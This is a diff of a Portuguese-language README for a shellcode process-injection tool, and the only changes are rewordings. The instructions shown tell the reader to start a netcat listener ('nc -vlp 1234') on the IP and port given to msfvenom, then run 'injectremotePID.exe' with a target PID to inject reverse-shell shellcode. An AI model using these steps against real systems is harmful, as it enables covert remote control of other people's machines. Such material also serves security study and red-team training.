@@ -95,14 +95,14 @@ injectremotePID.exe
 		Para sabermos o PID de um processo podemos usar o "ProcessHacker", "procexp" ou o próprio "Gerenciador de Tarefas".
 
 
-- Abrir a porta que colocamos como argumento no msfvenom para gerar o shellcode, no computador com o IP que também colocamos como argumento no msfvenom para gerar o shellcode :
+- Abrir a mesma porta que colocamos como argumento no msfvenom para gerar o shellcode, no computador com o IP que também colocamos como argumento no msfvenom para gerar o shellcode :
 
 
 ```bash
 nc -vlp 1234
 ```
 
-- Executar o binário compilado no _Step 2_ para injetar o shellcode passando o PID anotado acima como argumento na hora de executar o 'injectremotePID.exe' :
+- Executar o binário compilado no _Step 2_ para injetar o shellcode passando o PID anotado acima como argumento na linha de comando na hora de executar o 'injectremotePID.exe' :
 
 
 ```cmd
